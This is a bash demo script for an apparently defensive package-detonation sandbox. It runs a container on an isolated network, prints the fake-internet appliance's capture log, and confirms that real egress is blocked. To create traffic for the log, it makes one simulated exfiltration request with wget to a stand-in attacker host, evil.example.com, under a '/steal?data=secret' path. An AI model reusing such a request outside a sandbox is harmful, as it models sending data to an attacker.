#!/usr/bin/env bash
# demo-fake.sh — show DNS + HTTP capture on detonet, confirm no real egress.
# Run from the project root:  bash scripts/demo-fake.sh
# Or via:                     make demo-fake
#
# Requires: detonet created, pkgids-fakeinternet running.
# Uses Alpine (docker pull alpine if needed).

set -euo pipefail

DETONET="detonet"
FAKEINTERNET_IP="10.200.200.2"
LOGS_DIR="$(cd "$(dirname "$0")/.." && pwd)/logs/fakeinternet"
SEP="─────────────────────────────────────────────────────"

echo ""
echo "$SEP"
echo "  pkgids fake-internet demo"
echo "$SEP"

# ── 1. Run demo container: capture its own IP, then do DNS + HTTP ─────────────
echo ""
echo "[1/3]  Running demo container on detonet ..."

# The container prints its IP on the first line of stdout, then makes requests.
# nslookup and wget output is redirected to /dev/null so only the IP line
# reaches the shell variable.
DEMO_IP=$(docker run --rm \
  --network "$DETONET" \
  --dns     "$FAKEINTERNET_IP" \
  alpine sh -c '
    # Print own IP (first line captured by the shell)
    ip addr show eth0 \
      | grep "inet " \
      | awk "{print \$2}" \
      | cut -d/ -f1

    # DNS lookup — appliance logs query, resolves to itself
    nslookup evil.example.com >/dev/null 2>&1 || true

    # HTTP request — appliance logs Host header + full request line
    wget -q -O /dev/null \
      "http://evil.example.com/steal?data=secret" 2>/dev/null || true
  ')

echo "    Container IP on detonet: $DEMO_IP"

# Give the appliance a moment to flush its log
sleep 1

# ── 2. Print the capture log ──────────────────────────────────────────────────
echo ""
echo "[2/3]  Capture log: $LOGS_DIR/$DEMO_IP.jsonl"
echo "$SEP"

LOG_FILE="$LOGS_DIR/$DEMO_IP.jsonl"
if [[ -f "$LOG_FILE" ]]; then
  python3 -c "
import json, sys
for line in open('$LOG_FILE'):
    print(json.dumps(json.loads(line.strip()), indent=2))
"
else
  echo "  (log file not found — check that pkgids-fakeinternet is running)"
fi

echo "$SEP"

# ── 3. Confirm no real egress ─────────────────────────────────────────────────
echo ""
echo "[3/3]  Confirming no real egress (wget to 1.1.1.1 with 3-s timeout) ..."

EGRESS=$(docker run --rm \
  --network "$DETONET" \
  alpine sh -c \
    "wget -q -T 3 http://1.1.1.1/ -O /dev/null 2>&1 && echo OPEN || echo BLOCKED" \
)

if [[ "$EGRESS" == *"BLOCKED"* ]]; then
  echo "    OK — real egress is blocked (expected)."
else
  echo "    WARNING — real egress appears OPEN: $EGRESS"
fi

echo ""
echo "$SEP"
echo "  Demo complete."
echo "$SEP"
echo ""
